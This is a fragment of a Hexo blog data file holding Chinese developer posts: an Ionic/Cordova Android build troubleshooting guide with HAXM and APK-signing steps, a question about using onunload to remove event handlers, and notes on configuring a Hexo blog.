SDK Platform-tools (latest)</span><br><span class=\"line\">3. &quot;Android SDK Build-tools&quot; (latest)</span><br></pre></td></tr></table></figure></p>\n<p>装好后，运行命令：<code>ionic build android</code><br>如果看到许多点点点，就是成功了，接下来是漫长等待……<br>中间会出现很卧槽的东西：<br><img src=\"http://o798x2hdw.bkt.clouddn.com/ionic/9.jpg\" alt=\"ionic/9\"></p>\n<h1 id=\"Build成功，安装包打包完成\"><a href=\"#Build成功，安装包打包完成\" class=\"headerlink\" title=\"Build成功，安装包打包完成\"></a>Build成功，安装包打包完成</h1><p>但憋害怕，最终你会看到一个”BUILD SUCCESSFUL”<br><img src=\"http://o798x2hdw.bkt.clouddn.com/ionic/10.jpg\" alt=\"ionic/10\"><br>其实到这里已经打包完成了，你可以在上图中的那个路径找到build好的apk文件，然后就可以发到手机上安装了。但我当时看教程，还有一句命令<code>ionic emulate android</code>，于是就继续往下走了。这个是在电脑上模拟手机上的效果的，可以有很多替代方案，所以如果在这个步骤被卡住了，完全可以先放下，之后采用别的方式。</p>\n<hr>\n<h1 id=\"额外知识1：电脑上模拟手机效果\"><a href=\"#额外知识1：电脑上模拟手机效果\" class=\"headerlink\" title=\"额外知识1：电脑上模拟手机效果\"></a>额外知识1：电脑上模拟手机效果</h1><p>我在build successful之后输入<code>ionic emulate android</code></p>\n<h2 id=\"报错1-1\"><a href=\"#报错1-1\" class=\"headerlink\" title=\"报错1\"></a>报错1</h2><p>出了几行之后，卡住了：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Please ensure Intel HAXM is properly installed and usable.</span><br><span class=\"line\">CPU acceleration status: HAXM must be updated (version 1.1.1 &lt; 6.0.1).</span><br></pre></td></tr></table></figure></p>\n<p>搜索之，找到这个<a href=\"http://www.cnblogs.com/csulennon/p/4178404.html\" target=\"_blank\" rel=\"noopener\">链接</a>,</p>\n<blockquote>\n<p>HAXM作用是管理硬件加速的，估计是用了这个东西模拟器就能告别Eclipse时代的龟速。<br>你也可以在Inter官网下载这个HAXM，当然Android SDK已经集成了这个软件，你需要做的就是找到他，然后安装它就是了。<br>他的位置放在这个目录下：<br><img src=\"http://o798x2hdw.bkt.clouddn.com/ionic/19.png\" alt=\"ionic/19\"></p>\n</blockquote>\n<p>但是里面的haxm链接打开是404，你得使用这个<del><a href=\"https://software.intel.com/zh-cn/android/articles/intel-hardware-accelerated-execution-manager-end-user-license-agreement\" target=\"_blank\" rel=\"noopener\">链接</a></del><br><a href=\"http://download.csdn.net/detail/xfortune/9462367\" target=\"_blank\" rel=\"noopener\">链接</a></p>\n<h2 id=\"报错2-1\"><a href=\"#报错2-1\" class=\"headerlink\" title=\"报错2\"></a>报错2</h2><p>安装的时候会报错，我安装的时候报错，还跟po主的错误不一样：<br><code>Failed to configure driver:unknown error. Failed to open driver.</code><br>搜索之，找到这个<a href=\"https://software.intel.com/en-us/blogs/2013/04/25/workaround-patch-for-haxm-installation-error-failed-to-configure-driver-unknown\" target=\"_blank\" rel=\"noopener\">链接</a>，解决办法如下：<br><img src=\"http://o798x2hdw.bkt.clouddn.com/ionic/13.jpg\" alt=\"ionic/13\"><br>意思就是：</p>\n<ol>\n<li>下载上面链接中的zip文件</li>\n<li>解压到一个文件夹</li>\n<li>复制”hax_extract.cmd”到“IntelHaxm.exe”所在的文件夹，</li>\n<li>在复制过来的”hax_extract.cmd”上右键选择“以管理员身份运行”</li>\n<li>在弹出框里选yes</li>\n</ol>\n<p>之后再安装“IntelHaxm.exe”就可以了。如果不行，这个链接里还有许多别人的评论，可以浏览下看有没有别的解决方案。</p>\n<h2 id=\"成功\"><a href=\"#成功\" class=\"headerlink\" title=\"成功\"></a>成功</h2><p>照这个步骤走完，果然安装成功，bravo！经过漫长的Error岁月，回过头来看我们的ionic窗口，已经卡死在那里了。关了重新打开一个node shell窗口，进去项目文件夹，输入<code>ionic emulate android</code>，发现HAXM竟被装了个更低的版本，傻眼！于是又找到这个<a href=\"http://download.csdn.net/detail/xfortune/9462367\" target=\"_blank\" rel=\"noopener\">链接</a>，装上之后，重新打开node shell窗口，输入<code>ionic emulate android</code>，就可以啦！有一个手机模拟器，竟然有点激动，想哭有木有。<br><img src=\"http://o798x2hdw.bkt.clouddn.com/ionic/18.jpg\" alt=\"ionic/18\"></p>\n<h1 id=\"额外知识2：两种打包命令-amp-amp-安装哪个apk？\"><a href=\"#额外知识2：两种打包命令-amp-amp-安装哪个apk？\" class=\"headerlink\" title=\"额外知识2：两种打包命令 &amp;&amp; 安装哪个apk？\"></a>额外知识2：两种打包命令 &amp;&amp; 安装哪个apk？</h1><p><code>cordova build --release android</code><br><code>ionic build android [--debug | --release]</code><br>以下引用自这个<a href=\"http://blog.csdn.net/yourlin/article/details/48000083\" target=\"_blank\" rel=\"noopener\">链接</a></p>\n<ol>\n<li>第二个命令默认不带参数输出为debug版本，配置正确情况下会在myApp/platform/Android/outputs/APK/下面生成，对应的APK文件。</li>\n<li>debug模式下会输出2个APK，一个是不带签名的，一个是带debug签名的，带debug签名的APK可以在手机上安装测试</li>\n<li><p>release模式下会输出1个不带数字签名APK，需要自己对该APK进行签名<br>###额外知识3：APK数字签名###<br>进入APK文件所在的目录 </p>\n</li>\n<li><p>先产生密钥文件<br><code>keytool -genkey -alias demo.keystore -keyalg RSA -validity 40000 -keystore demo.keystore</code><br>这个-validity 40000，意思是证书有效期40000天 </p>\n</li>\n<li><p>再给文件签名<br><code>jarsigner -verbose -keystore demo.keystore -signedjar CoderCalendar.apk android-release-unsigned.apk demo.keystore -digestalg SHA1 -sigalg MD5withRSA</code><br>CoderCalendar.apk 是我们生成的目标文件名<br>android-release-unsigned.apk 是需要被签名的APK文件</p>\n</li>\n</ol>\n<hr>\n<h1 id=\"结语\"><a href=\"#结语\" class=\"headerlink\" title=\"结语\"></a>结语</h1><p>写出来觉得很少，而在实际操作中，遇到问题、找答案、一个个答案试错、以及下载1.2G安装包的过程，都是很崩溃的，体验了好几次“山重水复”和“柳暗花明”，记下一点经验，希望给同行的朋友一点参考。:)</p>\n","site":{"data":{}},"excerpt":"<p>公司之前使用appcan进行Hybrid App开发，其中遇到过许多问题，最严重的是性能差，所以新项目希望转向ionic + ng进行移动app开发。公司里之前没有人用过，于是领导就把这一光荣的任务交给了我，于是我就开始了<del>自虐</del>开心的踩坑过程！本文主要集中于开发环境的配置。<br></p>","more":"<br>开始之前请先安装nodeJS。我首先是去<a href=\"http://ionicframework.com/getting-started/\" title=\"ionic 官网\" target=\"_blank\" rel=\"noopener\">官网</a>看文档：<p></p>\n<h1 id=\"1、安装Ionic\"><a href=\"#1、安装Ionic\" class=\"headerlink\" title=\"1、安装Ionic\"></a>1、安装Ionic</h1><p>打开nodeJS的shell窗口，（曾试过直接在cmd窗口中输npm命令，会有奇怪的问题）输入<br><code>npm install -g cordova ionic</code></p>\n<h1 id=\"2、开始一个项目\"><a href=\"#2、开始一个项目\" class=\"headerlink\" title=\"2、开始一个项目\"></a>2、开始一个项目</h1><p><code>ionic start myApp tabs</code><br>这句里的tabs还有两种选择：blank、sidemenu，分别对应不同种类的app界面。找到你的myApp文件夹，下面就是一个seed project，你可以在这个项目基础上进行开发你自己的APP。可以说到这里你已经完成了开发环境的配置，下面就属于把项目打包成手机安装包的过程了。</p>\n<h1 id=\"3、打包-在手机上跑起来-android\"><a href=\"#3、打包-在手机上跑起来-android\" class=\"headerlink\" title=\"3、打包 / 在手机上跑起来(android)\"></a>3、打包 / 在手机上跑起来(android)</h1><p>按照官网上的教程，建ios的APP命令如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd myApp</span><br><span class=\"line\">ionic platform add ios</span><br><span class=\"line\">ionic build ios</span><br><span class=\"line\">ionic emulate ios</span><br></pre></td></tr></table></figure></p>\n<p>推测建安卓APP的时候，就应该把上面命令中的ios换成android：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd myApp</span><br><span class=\"line\">ionic platform add android</span><br><span class=\"line\">ionic build android</span><br></pre></td></tr></table></figure></p>\n<p>当时走到这一步时看了别的教程，我直接用的下面的命令：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd myApp</span><br><span class=\"line\">ionic platform add android</span><br><span class=\"line\">ionic run android</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"报错1\"><a href=\"#报错1\" class=\"headerlink\" title=\"报错1\"></a>报错1</h1><p>输入之后报错了，错误信息：<br><img src=\"http://o798x2hdw.bkt.clouddn.com/ionic/7.jpg\" alt=\"ionic/7\"><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Error: Failed to find &apos;ANDROID_HOME&apos; environment variable. Try setting setting it manually.</span><br><span class=\"line\">Failed to find &apos;android&apos; command in your &apos;PATH&apos;. Try update your &apos;PATH&apos; to include path to valid SDK directory.</span><br></pre></td></tr></table></figure></p>\n<p>把错误提示扔到谷歌里，找到StackOverflow上说<strong>要安装android studio</strong>，<a href=\"https://developer.android.com/studio/install.html\" title=\"android studio\" target=\"_blank\" rel=\"noopener\">这里是官网安装包下载地址</a>，需要翻墙且文件很大，1.2G，我用的<a href=\"https://do1.glbproxy.tk/?r=1/?r=1&amp;name=miao.hnlk@foxmail.com\" target=\"_blank\" rel=\"noopener\">梯子</a>，（通过这个链接购买的，你的账户可以增加10天），实在不想翻墙也可以找下国内的下载链接，只是版本都比较低。下载到一半，发现有同事现成下好的，大喜！</p>\n<h1 id=\"报错2\"><a href=\"#报错2\" class=\"headerlink\" title=\"报错2\"></a>报错2</h1><p>如果你输入platform那句之后，运行的这个命令：<code>ionic build android</code>，有这样的报错：<br>那么建议你可以装一下android studio试试。<br><img src=\"http://o798x2hdw.bkt.clouddn.com/ionic/8.jpg\" alt=\"ionic/8\"><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Error: Please install Android target: &quot;android-23&quot;.</span><br><span class=\"line\">Hint: Open the SDK manager by running: &quot;C:\\Users\\mary.tien\\AppData\\Local\\Android</span><br><span class=\"line\">\\sdk\\tools\\android.bat&quot;</span><br><span class=\"line\">You will require:</span><br><span class=\"line\">1. &quot;SDK Platform&quot; for android-23</span><br><span class=\"line\">2. &quot;Android SDK Platform-tools (latest)</span><br><span class=\"line\">3. &quot;Android SDK Build-tools&quot; (latest)</span><br></pre></td></tr></table></figure></p>\n<p>装好后，运行命令：<code>ionic build android</code><br>如果看到许多点点点，就是成功了，接下来是漫长等待……<br>中间会出现很卧槽的东西：<br><img src=\"http://o798x2hdw.bkt.clouddn.com/ionic/9.jpg\" alt=\"ionic/9\"></p>\n<h1 id=\"Build成功，安装包打包完成\"><a href=\"#Build成功，安装包打包完成\" class=\"headerlink\" title=\"Build成功，安装包打包完成\"></a>Build成功，安装包打包完成</h1><p>但憋害怕，最终你会看到一个”BUILD SUCCESSFUL”<br><img src=\"http://o798x2hdw.bkt.clouddn.com/ionic/10.jpg\" alt=\"ionic/10\"><br>其实到这里已经打包完成了，你可以在上图中的那个路径找到build好的apk文件，然后就可以发到手机上安装了。但我当时看教程，还有一句命令<code>ionic emulate android</code>，于是就继续往下走了。这个是在电脑上模拟手机上的效果的，可以有很多替代方案，所以如果在这个步骤被卡住了，完全可以先放下，之后采用别的方式。</p>\n<hr>\n<h1 id=\"额外知识1：电脑上模拟手机效果\"><a href=\"#额外知识1：电脑上模拟手机效果\" class=\"headerlink\" title=\"额外知识1：电脑上模拟手机效果\"></a>额外知识1：电脑上模拟手机效果</h1><p>我在build successful之后输入<code>ionic emulate android</code></p>\n<h2 id=\"报错1-1\"><a href=\"#报错1-1\" class=\"headerlink\" title=\"报错1\"></a>报错1</h2><p>出了几行之后，卡住了：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Please ensure Intel HAXM is properly installed and usable.</span><br><span class=\"line\">CPU acceleration status: HAXM must be updated (version 1.1.1 &lt; 6.0.1).</span><br></pre></td></tr></table></figure></p>\n<p>搜索之，找到这个<a href=\"http://www.cnblogs.com/csulennon/p/4178404.html\" target=\"_blank\" rel=\"noopener\">链接</a>,</p>\n<blockquote>\n<p>HAXM作用是管理硬件加速的，估计是用了这个东西模拟器就能告别Eclipse时代的龟速。<br>你也可以在Inter官网下载这个HAXM，当然Android SDK已经集成了这个软件，你需要做的就是找到他，然后安装它就是了。<br>他的位置放在这个目录下：<br><img src=\"http://o798x2hdw.bkt.clouddn.com/ionic/19.png\" alt=\"ionic/19\"></p>\n</blockquote>\n<p>但是里面的haxm链接打开是404，你得使用这个<del><a href=\"https://software.intel.com/zh-cn/android/articles/intel-hardware-accelerated-execution-manager-end-user-license-agreement\" target=\"_blank\" rel=\"noopener\">链接</a></del><br><a href=\"http://download.csdn.net/detail/xfortune/9462367\" target=\"_blank\" rel=\"noopener\">链接</a></p>\n<h2 id=\"报错2-1\"><a href=\"#报错2-1\" class=\"headerlink\" title=\"报错2\"></a>报错2</h2><p>安装的时候会报错，我安装的时候报错，还跟po主的错误不一样：<br><code>Failed to configure driver:unknown error. Failed to open driver.</code><br>搜索之，找到这个<a href=\"https://software.intel.com/en-us/blogs/2013/04/25/workaround-patch-for-haxm-installation-error-failed-to-configure-driver-unknown\" target=\"_blank\" rel=\"noopener\">链接</a>，解决办法如下：<br><img src=\"http://o798x2hdw.bkt.clouddn.com/ionic/13.jpg\" alt=\"ionic/13\"><br>意思就是：</p>\n<ol>\n<li>下载上面链接中的zip文件</li>\n<li>解压到一个文件夹</li>\n<li>复制”hax_extract.cmd”到“IntelHaxm.exe”所在的文件夹，</li>\n<li>在复制过来的”hax_extract.cmd”上右键选择“以管理员身份运行”</li>\n<li>在弹出框里选yes</li>\n</ol>\n<p>之后再安装“IntelHaxm.exe”就可以了。如果不行，这个链接里还有许多别人的评论，可以浏览下看有没有别的解决方案。</p>\n<h2 id=\"成功\"><a href=\"#成功\" class=\"headerlink\" title=\"成功\"></a>成功</h2><p>照这个步骤走完，果然安装成功，bravo！经过漫长的Error岁月，回过头来看我们的ionic窗口，已经卡死在那里了。关了重新打开一个node shell窗口，进去项目文件夹，输入<code>ionic emulate android</code>，发现HAXM竟被装了个更低的版本，傻眼！于是又找到这个<a href=\"http://download.csdn.net/detail/xfortune/9462367\" target=\"_blank\" rel=\"noopener\">链接</a>，装上之后，重新打开node shell窗口，输入<code>ionic emulate android</code>，就可以啦！有一个手机模拟器，竟然有点激动，想哭有木有。<br><img src=\"http://o798x2hdw.bkt.clouddn.com/ionic/18.jpg\" alt=\"ionic/18\"></p>\n<h1 id=\"额外知识2：两种打包命令-amp-amp-安装哪个apk？\"><a href=\"#额外知识2：两种打包命令-amp-amp-安装哪个apk？\" class=\"headerlink\" title=\"额外知识2：两种打包命令 &amp;&amp; 安装哪个apk？\"></a>额外知识2：两种打包命令 &amp;&amp; 安装哪个apk？</h1><p><code>cordova build --release android</code><br><code>ionic build android [--debug | --release]</code><br>以下引用自这个<a href=\"http://blog.csdn.net/yourlin/article/details/48000083\" target=\"_blank\" rel=\"noopener\">链接</a></p>\n<ol>\n<li>第二个命令默认不带参数输出为debug版本，配置正确情况下会在myApp/platform/Android/outputs/APK/下面生成，对应的APK文件。</li>\n<li>debug模式下会输出2个APK，一个是不带签名的，一个是带debug签名的，带debug签名的APK可以在手机上安装测试</li>\n<li><p>release模式下会输出1个不带数字签名APK，需要自己对该APK进行签名<br>###额外知识3：APK数字签名###<br>进入APK文件所在的目录 </p>\n</li>\n<li><p>先产生密钥文件<br><code>keytool -genkey -alias demo.keystore -keyalg RSA -validity 40000 -keystore demo.keystore</code><br>这个-validity 40000，意思是证书有效期40000天 </p>\n</li>\n<li><p>再给文件签名<br><code>jarsigner -verbose -keystore demo.keystore -signedjar CoderCalendar.apk android-release-unsigned.apk demo.keystore -digestalg SHA1 -sigalg MD5withRSA</code><br>CoderCalendar.apk 是我们生成的目标文件名<br>android-release-unsigned.apk 是需要被签名的APK文件</p>\n</li>\n</ol>\n<hr>\n<h1 id=\"结语\"><a href=\"#结语\" class=\"headerlink\" title=\"结语\"></a>结语</h1><p>写出来觉得很少，而在实际操作中，遇到问题、找答案、一个个答案试错、以及下载1.2G安装包的过程，都是很崩溃的，体验了好几次“山重水复”和“柳暗花明”，记下一点经验，希望给同行的朋友一点参考。:)</p>"},{"title":"onunload用于移除事件处理程序的疑问","date":"2016-05-16T05:30:00.000Z","toc":true,"comments":1,"_content":"\n看红皮书的时候看到13.4.1 “UI事件”，对onunload事件的使用产生了疑问，文中说法疑似有前后矛盾的地方。问几个人以及查资料暂时没有解决这个问题，存疑，待我解决后再更新结果。\n<!-- More -->\n按照书上说法：\n>与 load 事件对应的是 unload 事件，这个事件在文档被完全卸载后触发。只要用户从一个页面切换到另一个页面，就会发生 unload 事件。而利用这个事件最多的情况是清除引用，以避免内存泄漏。\n\n\n>无论使用哪种方式，都要小心编写 onunload 事件处理程序中的代码。既然 unload 事件是在一切都被卸载之后才触发，那么在页面加载后存在的那些对象，此时就不一定存在了。此时，操作 DOM 节\n点或者元素的样式就会导致错误。\n\n以及13.5.2 “移除事件处理程序”：\n\n>导致“空事件处理程序”的另一种情况，就是卸载页面的时候……一般来说，最好的做法是在页面卸载之前，先通过 onunload 事件处理程序移除所有事件处理程序。\n\n产生一个疑问：**因为事件处理程序是加在DOM节点上的，既然不能访问DOM了，那怎么做到清除事件处理程序呢？**\n","source":"_posts/Question_About_Onunload.md","raw":"---\ntitle: onunload用于移除事件处理程序的疑问\ndate: 2016-5-16 13:30:00\ncategories: Javascript\ntags: [onunload,红皮书,高程, 读书笔记,存疑] #文章标签，可空，多标签请用格式，注意:后面有个空格\ntoc: true\ncomments: true\n---\n\n看红皮书的时候看到13.4.1 “UI事件”，对onunload事件的使用产生了疑问，文中说法疑似有前后矛盾的地方。问几个人以及查资料暂时没有解决这个问题，存疑，待我解决后再更新结果。\n<!-- More -->\n按照书上说法：\n>与 load 事件对应的是 unload 事件，这个事件在文档被完全卸载后触发。只要用户从一个页面切换到另一个页面，就会发生 unload 事件。而利用这个事件最多的情况是清除引用，以避免内存泄漏。\n\n\n>无论使用哪种方式，都要小心编写 onunload 事件处理程序中的代码。既然 unload 事件是在一切都被卸载之后才触发，那么在页面加载后存在的那些对象，此时就不一定存在了。此时，操作 DOM 节\n点或者元素的样式就会导致错误。\n\n以及13.5.2 “移除事件处理程序”：\n\n>导致“空事件处理程序”的另一种情况，就是卸载页面的时候……一般来说，最好的做法是在页面卸载之前，先通过 onunload 事件处理程序移除所有事件处理程序。\n\n产生一个疑问：**因为事件处理程序是加在DOM节点上的，既然不能访问DOM了，那怎么做到清除事件处理程序呢？**\n","slug":"Question_About_Onunload","published":1,"updated":"2018-05-07T10:29:59.528Z","layout":"post","photos":[],"link":"","_id":"cjgw4444l00068d95q7m89vmd","content":"<p>看红皮书的时候看到13.4.1 “UI事件”，对onunload事件的使用产生了疑问，文中说法疑似有前后矛盾的地方。问几个人以及查资料暂时没有解决这个问题，存疑，待我解决后再更新结果。<br><a id=\"more\"></a><br>按照书上说法：</p>\n<blockquote>\n<p>与 load 事件对应的是 unload 事件，这个事件在文档被完全卸载后触发。只要用户从一个页面切换到另一个页面，就会发生 unload 事件。而利用这个事件最多的情况是清除引用，以避免内存泄漏。</p>\n</blockquote>\n<blockquote>\n<p>无论使用哪种方式，都要小心编写 onunload 事件处理程序中的代码。既然 unload 事件是在一切都被卸载之后才触发，那么在页面加载后存在的那些对象，此时就不一定存在了。此时，操作 DOM 节<br>点或者元素的样式就会导致错误。</p>\n</blockquote>\n<p>以及13.5.2 “移除事件处理程序”：</p>\n<blockquote>\n<p>导致“空事件处理程序”的另一种情况，就是卸载页面的时候……一般来说，最好的做法是在页面卸载之前，先通过 onunload 事件处理程序移除所有事件处理程序。</p>\n</blockquote>\n<p>产生一个疑问：<strong>因为事件处理程序是加在DOM节点上的，既然不能访问DOM了，那怎么做到清除事件处理程序呢？</strong></p>\n","site":{"data":{}},"excerpt":"<p>看红皮书的时候看到13.4.1 “UI事件”，对onunload事件的使用产生了疑问，文中说法疑似有前后矛盾的地方。问几个人以及查资料暂时没有解决这个问题，存疑，待我解决后再更新结果。<br></p>","more":"<br>按照书上说法：<p></p>\n<blockquote>\n<p>与 load 事件对应的是 unload 事件，这个事件在文档被完全卸载后触发。只要用户从一个页面切换到另一个页面，就会发生 unload 事件。而利用这个事件最多的情况是清除引用，以避免内存泄漏。</p>\n</blockquote>\n<blockquote>\n<p>无论使用哪种方式，都要小心编写 onunload 事件处理程序中的代码。既然 unload 事件是在一切都被卸载之后才触发，那么在页面加载后存在的那些对象，此时就不一定存在了。此时，操作 DOM 节<br>点或者元素的样式就会导致错误。</p>\n</blockquote>\n<p>以及13.5.2 “移除事件处理程序”：</p>\n<blockquote>\n<p>导致“空事件处理程序”的另一种情况，就是卸载页面的时候……一般来说，最好的做法是在页面卸载之前，先通过 onunload 事件处理程序移除所有事件处理程序。</p>\n</blockquote>\n<p>产生一个疑问：<strong>因为事件处理程序是加在DOM节点上的，既然不能访问DOM了，那怎么做到清除事件处理程序呢？</strong></p>"},{"title":"使用Hexo踩坑小记","date":"2016-07-02T05:30:00.000Z","toc":true,"comments":1,"_content":"\n之前就装好了Hexo，但仍有好多未完成的部分，所有的细节堆起来就是一个大工程啦，记录一下坑坑们，那都是我逝去的青春π__π\n<!-- More -->\n## 1、语言 ##\nHexo语言设置在hexo项目根文件夹下的_config.yml中配置，找到language，不是chinese，不是zh-CN，我之前设置为zh-CN，会导致语言变为德文，文章标题下面的时间戳前面会变成“Veröffentlicht am”，要设为\n`language: zh-Hans`\n如果设置之后还不起作用，请到theme/next/languages/目录下查看是否有zh-Hans.yml（zh-EN.yml)文件，如果没有，请直接到next的Github下载相应文件添加即可。\n## 2、文章折叠 ##\n按照一般的Hexo教程进行安装，安装好后，首页文章没有折叠起来，全部是默认打开的，而我们希望每篇文章只显示部分内容，用户点击more的时候，再展开到详情页面。要做到这样，只需在.md文章里，在需要截取那段展示出来文字的地方添加 `<!-- More -->`，这样后面的文字都默认不显示，并出现一个More按钮\n更详细的说明，可以看这个[链接](http://www.zhihu.com/question/40674614 'hexo 文章无法折叠？')\n## 3、图片以及头像 ##\ngithub page页的容量限制是300M，如果图片比较少，可以放在本地路径，我现在就是。\n使用方法：\n（注意下面1和2不可混用，用1就要卸载2的插件，用2就不要用1的语法，别问我怎么知道的）\n\n### 1. Hexo官方插入图片方法\n\n1. config.yml 文件中的 post_asset_folder 选项设为 true\n2. Hexo将会在你通过 hexo new [layout] <title> 命令创建新文章时自动创建一个文件夹，这个资源文件夹将会有与这个 markdown 文件一样的名字，然后你就可以使用相对路径来引用图片了\n3. 当你打开文章资源文件夹功能后，你把一个 example.jpg 图片放在了你的资源文件夹中，如果通过使用相对路径的常规 markdown 语法 `![](/example.jpg)` ，它将不会出现在首页上。（但是它会在文章中按你期待的方式工作）\n正确的引用图片方式是使用下列的标签插件而不是 markdown ：\n```\n{% asset_img example.jpg This is an example image %}\n```\n\n### 2. 使用hexo-asset-image插件插入图片\n\n1. 首先确认 _config.yml 中有 post_asset_folder:true 。\n2. 在 hexo 目录，执行\n`npm install https://github.com/CodeFalling/hexo-asset-image --save`\n假设在\n```\nMacGesture2-Publish\n├── apppicker.jpg\n├── logo.jpg\n└── rules.jpg\nMacGesture2-Publish.md\n```\n这样的目录结构（目录名和文章名一致），只要使用 `![logo](MacGesture2-Publish/logo.jpg) `就可以插入图片。\n\n### 3. 使用千牛做图床 ###\n可以参考这个链接[如何使用七牛云做为图床？](http://cnfeat.com/blog/2015/11/30/cli-qiniu/#section-7)\n我采用他说的第一种方法，也就是七牛云的上传插件[qiniu upload files](https://chrome.google.com/webstore/detail/qiniu-upload-files/emmfkgdgapbjphdolealbojmcmnphdcc)，遇到了一个小障碍，就是在填写配置表格的时候，这个域名:\n![hexo/qiniu](http://o798x2hdw.bkt.clouddn.com/hexo_qiniu.png)\n不是你博客的域名，而是七牛生成的外链的域名，在七牛云----->marys存储空间(marys是我的存储空间名字)---->内容管理，里面可以看到你通过插件上传的图片，那个外链默认域名才是你需要填进去的域名，通过操作->复制外链可以直接复制：\n![hexo/qiniu](http://o798x2hdw.bkt.clouddn.com/setdomain.png)\nkeyword:七牛云 图床 图片404 上传插件\n### 4. 修改头像 ###\n进去themes/next/_config.yml，搜索avatar，去掉#注释，avatar: 后接你的头像图片URL。头像图片放next主题下的images文件夹，url就写成/images/avatar.jpg\n\n## 4、markdown标题不解析 ##\n解析出来后，标题的#号仍然显示，并且标题没有加粗等这些格式：\nmarkdown标题标准写法需要在\"#\"和后面字符之间加一个空格，如果不加空格，有些引擎就解析不了\n\n## 5、百度统计 ##\n直接甩链接系列：[NexT主题文档之百度统计](http://theme-next.iissnan.com/getting-started.html#analysis-system-baidu)\n## 6、评论 ##\n评论可以用多说评论框，但是用了多说评论框，你的文章就会自动被扒走，然后放到推酷这个网站上，你还啥都不知道（囧不懂脸）。所以我用的是国外的disqus，直接甩链接系列:\n\n1. [告别多说，拥抱 Disqus](https://blog.jamespan.me/2015/04/18/goodbye-duoshuo/)\n2. [解決 Hexo Comment !](http://morris821028.github.io/2014/04/12/web/hexo-comment/)\n\n## 7、文章阅读量 ##\n\n直接甩链接系列：[NexT主题文档之阅读次数统计（LeanCloud) ](http://theme-next.iissnan.com/getting-started.html#leanclound-page-views)\n\n## 8、Rss ##\n1. 安装生成插件\n`npm install hexo-generator-feed --save`\n2. 修改配置文件，在hexo根目录下的_config.yml中添加以下内容：\n```\nfeed:\n  type: atom\n  path: atom.xml\n  limit: 20\n  hub:\n```\n3. 修改主题配置文件_config.yml，添加以下内容，以在页面中显示rss按钮：\n`rss: /atom.xml`\n---\n参考链接：\n\n1. [Hexo的next主题变成德语](http://www.zhihu.com/question/41625825)\n2. [Hexo文章无法折叠？](http://www.zhihu.com/question/40674614)\n3. [Hexo官方文档-资源文件夹](https://hexo.io/zh-cn/docs/asset-folders.html)\n4. [在Hexo中无痛使用本地图片](http://www.tuicool.com/articles/umEBVfI)\n5. [hexo博客 markdown解析不了标题](http://www.thinksaas.cn/ask/question/22799/)\n6. [你还敢用“多说评论框”吗？](http://tieba.baidu.com/p/1683464316)","source":"_posts/Obstacles_I_Met_When_Using_Hexo.md","raw":"---\ntitle: 使用Hexo踩坑小记\ndate: 2016-7-2 13:30:00\ncategories: 框架\ntags: [Hexo,踩坑,博客,七牛云] #文章标签，可空，多标签请用格式，注意:后面有个空格\ntoc: true\ncomments: true\n---\n\n之前就装好了Hexo，但仍有好多未完成的部分，所有的细节堆起来就是一个大工程啦，记录一下坑坑们，那都是我逝去的青春π__π\n<!-- More -->\n## 1、语言 ##\nHexo语言设置在hexo项目根文件夹下的_config.yml中配置，找到language，不是chinese，不是zh-CN，我之前设置为zh-CN，会导致语言变为德文，文章标题下面的时间戳前面会变成“Veröffentlicht am”，要设为\n`language: zh-Hans`\n如果设置之后还不起作用，请到theme/next/languages/目录下查看是否有zh-Hans.yml（zh-EN.yml)文件，如果没有，请直接到next的Github下载相应文件添加即可。\n## 2、文章折叠 ##\n按照一般的Hexo教程进行安装，安装好后，首页文章没有折叠起来，全部是默认打开的，而我们希望每篇文章只显示部分内容，用户点击more的时候，再展开到详情页面。要做到这样，只需在.md文章里，在需要截取那段展示出来文字的地方添加 `<!-- More -->`，这样后面的文字都默认不显示，并出现一个More按钮\n更详细的说明，可以看这个[链接](http://www.zhihu.com/question/40674614 'hexo 文章无法折叠？')\n## 3、图片以及头像 ##\ngithub page页的容量限制是300M，如果图片比较少，可以放在本地路径，我现在就是。\n使用方法：\n（注意下面1和2不可混用，用1就要卸载2的插件，用2就不要用1的语法，别问我怎么知道的）\n\n### 1. Hexo官方插入图片方法\n\n1. config.yml 文件中的 post_asset_folder 选项设为 true\n2. Hexo将会在你通过 hexo new [layout] <title> 命令创建新文章时自动创建一个文件夹，这个资源文件夹将会有与这个 markdown 文件一样的名字，然后你就可以使用相对路径来引用图片了\n3. 当你打开文章资源文件夹功能后，你把一个 example.jpg 图片放在了你的资源文件夹中，如果通过使用相对路径的常规 markdown 语法 `![](/example.jpg)` ，它将不会出现在首页上。（但是它会在文章中按你期待的方式工作）\n正确的引用图片方式是使用下列的标签插件而不是 markdown ：\n```\n{% asset_img example.jpg This is an example image %}\n```\n\n### 2. 使用hexo-asset-image插件插入图片\n\n1. 首先确认 _config.yml 中有 post_asset_folder:true 。\n2. 在 hexo 目录，执行\n`npm install https://github.com/CodeFalling/hexo-asset-image --save`\n假设在\n```\nMacGesture2-Publish\n├── apppicker.jpg\n├── logo.jpg\n└── rules.jpg\nMacGesture2-Publish.md\n```\n这样的目录结构（目录名和文章名一致），只要使用 `![logo](MacGesture2-Publish/logo.jpg) `就可以插入图片。\n\n### 3. 使用千牛做图床 